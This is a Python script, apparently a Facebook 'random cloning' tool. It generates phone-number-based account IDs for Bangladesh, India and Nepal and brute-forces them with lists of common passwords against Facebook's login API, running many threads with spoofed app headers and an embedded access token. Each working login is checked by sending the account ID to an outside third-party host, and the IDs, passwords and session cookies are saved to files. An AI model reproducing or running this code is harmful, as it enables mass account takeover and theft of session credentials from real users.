#SCRIPTS CREATE BY HABIB HOSSAIN 
#SCRIPTS GIFT FOR EVERYONE
#-----------------------• IMPORT •-----------------------#
import os,base64,zlib,pip,urllib,sys,os,marshal,base64,zlib 
from os import path
try:
        os.system('clear')
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system('pip install requests futures==2 > /dev/null')
except:pass
#-----------------------• USER AGENT •-----------------------#
def siamua():
    END = "[[FBAN/FB4A;FBAV/274.0.0.46.119;FBBV/219237436;FBDM/{density=2.0,width=720,height=1384};FBLC/th_TH;FBRV/0;FBCR/DTAC;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J415F;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    ua = "[FBAN/FB4A;FBAV/" + str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ";FBBV/" + str(random.randint(1111111, 7777777)) + ";" + END
    return ua    
#-----------------------• LOOP •-----------------------#
user=[];ok=[];cp=[];twf=[];cpx=[];cokix=[];plist=[];loop=0
#-----------------------• COLOUR •-----------------------#
G="\x1b[38;5;46m";W="\x1b[38;5;15m";B="\x1b[38;5;8m";Y="\x1b[38;5;226m";A="\x1b[38;5;123m";R="\x1b[38;5;160m";O="\x1b[38;5;81m";X="\x1b[38;5;205m";P="\033[0;34m"
#-----------------------• STYLE •-----------------------#
xd=f"{G}->>{W}";xd1=f"{G}•{W}1";xd2=f"{G}•{W}2";xd3=f"{G}•{W}3";xd4=f"{G}•{W}4";xd5=f"{G}•{W}5";xd0=f"{G}•{W}0";xdx=f"{G}•{W}?";xdxx=f"{G}•{W}"
#-----------------------• CLEAR •-----------------------#
def clear():os.system('clear');print(logo)
def linex():print(f'{W}──────────────────────────────────────────────────')
#-----------------------• LOGO •-----------------------#
logo = f"""{P}
  >=>>=>   >=>       >>       >=>       >=> 
>=>    >=> >=>      >>=>      >> >=>   >>=> 
 >=>       >=>     >> >=>     >=> >=> > >=> 
   >=>     >=>    >=>  >=>    >=>  >=>  >=> 
      >=>  >=>   >=====>>=>   >=>   >>  >=> 
>=>    >=> >=>  >=>      >=>  >=>       >=> 
  >=>>=>   >=> >=>        >=> >=>       >=> 
                                            
{W}──────────────────────────────────────────────────
{xd} DEVELOPER {xd} SIAM
{xd} TOOLS     {xd} RANDOM{xd}CLONING
{xd} STATUS    {xd} PAID
{W}──────────────────────────────────────────────────"""
#-----------------------• MENU •-----------------------#
def ___menu___():
    clear();print(f'{xd}{G} RANDOM {G}BANG{R}LADESH {G}CLONING ');print(f'{xd}{Y} RANDOM INDIA CLONING ');print(f'{xd}{O} RANDOM NEPAL CLONING ');linex();chude = input(f"{xdx} SELECT {xd}{G} ")
    if chude in ['1']:___Bangladesh___()
    elif chude in ['2']:___India___()
    elif chude in ['3']:___Nepal___()
    else:print(f"{xd} YOU HAVE SELECTED THE WRONG OPTION....");exit()
#-----------------------• BANGLADESH RANDOM •-----------------------#
def ___Bangladesh___():
	clear();print(f"{xd} EXAMPLE {xd} 017 {xd} 018 {xd} 019 {xd} 016");linex();code = input(f"{xdx} SELECT {xd}{G} ");clear();print(f"{xd} EXAMPLE {xd} 3000 {xd} 5000 {xd} 9999 {xd} 99999");linex();limit = int(input(f"{xdx} SELECT {xd}{G} "))
	for Kid in range(limit):SIAMxd = ''.join(random.choice(string.digits) for _ in range(8));user.append(SIAMxd)
	with tred(max_workers=30) as __ex__:
		clear();tl = str(len(user))
		print(f"{xd} SIM CODE {xd}{A} {code} {G}{W}\n{xd} TOTAL UID {xd}{G} {limit}");print(f'\n{xd} FLIGHT MODE ON{G}|{W}OFF EVERY 3 MINUTES');linex()
		for love in user:
			ids = code + love 
			pasx = [ids,love,love[1:],ids[:7],ids[:6],ids[:8],'bangladesh','506070','405060','102030','i love you','708090','@@@###','@#@#@#']
			__ex__.submit(___XD___,ids,pasx,tl)
#-----------------------• INDIA RANDOM •-----------------------#
def ___India___():
	clear();print(f"{xd} EXAMPLE {xd} +91639 {xd} +91633 {xd} +91699 {xd} +91647");linex();code = input(f"{xdx} SELECT {xd}{G} ");clear();print(f"{xd} EXAMPLE {xd} 3000 {xd} 5000 {xd} 9999 {xd} 99999");linex();limit = int(input(f"{xdx} SELECT {xd}{G} "))
	for Kid in range(limit):SIAMxd = ''.join(random.choice(string.digits) for _ in range(7));user.append(SIAMxd)
	with tred(max_workers=30) as __ex__:
		clear();tl = str(len(user))
		print(f"{xd} SIM CODE {xd}{G} {code} {G}|{W} TOTAL UID {xd}{G} {limit}");print(f'{xd} FLIGHT MODE ON{G}|{W}OFF EVERY 3 MINUTES');linex()
		for love in user:
			ids = code + love 
			pasx = ['57575751','57273200','59039200',ids,love,ids[3:]]
			__ex__.submit(___XD___,ids,pasx,tl)
#-----------------------• NEPAL RANDOM •-----------------------#
def ___Nepal___():
	clear();print(f"{xd} EXAMPLE {xd} 9815 {xd} 9823 {xd} 9834 {xd} 9812");linex();code = input(f"{xdx} SELECT {xd}{G} ");clear();print(f"{xd} EXAMPLE {xd} 3000 {xd} 5000 {xd} 9999 {xd} 99999");linex();limit = int(input(f"{xdx} SELECT {xd}{G} "))
	for Kid in range(limit):SIAMxd = ''.join(random.choice(string.digits) for _ in range(6));user.append(SIAMxd)
	with tred(max_workers=30) as __ex__:
		clear();tl = str(len(user))
		print(f"{xd} SIM CODE {xd}{G} {code} {G}|{W} TOTAL UID {xd}{G} {limit}");print(f'{xd} FLIGHT MODE ON{G}|{W}OFF EVERY 3 MINUTES');linex()
		for love in user:
			ids = code + love 
			pasx = [ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
			__ex__.submit(___XD___,ids,pasx,tl)
#-----------------------• RANDOM METHOD •-----------------------#
def ___XD___(ids,pasx,tl):
        global loop,ok,cp
        sys.stdout.write(f'\r{xd} SIAM {loop}{B}|{G}{len(ok)}{B}|{X}{len(cp)} ');sys.stdout.flush()
        try:
                for pas in pasx:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        user_agent = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/vi_VN;FBMF/Era 2X;FBBD/Era 2X;FBDV/XOLO;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': siamua(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'Wi-Fi', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://api.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                response = str(requests.get(f"http://www.hearhour.shop/ajaxs/client/check-live-fb.php?uid={uid}").text)
                                if "LIVE" in response:
                                	print(f'\r{xd}{G} SIAM-OK {str(uid)} | {pas} | {coki} ');linex()
                                	open('/sdcard/SIAM-RANDOM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                	ok.append(str(uid))
                                	break
                                else:continue
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                print(f'\r{xd}{X} SIAM-CP {str(uid)} | {pas} ')
                                open('/sdcard/SIAM-RANDOM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass                        
#-----------------------• END •-----------------------#
___menu___()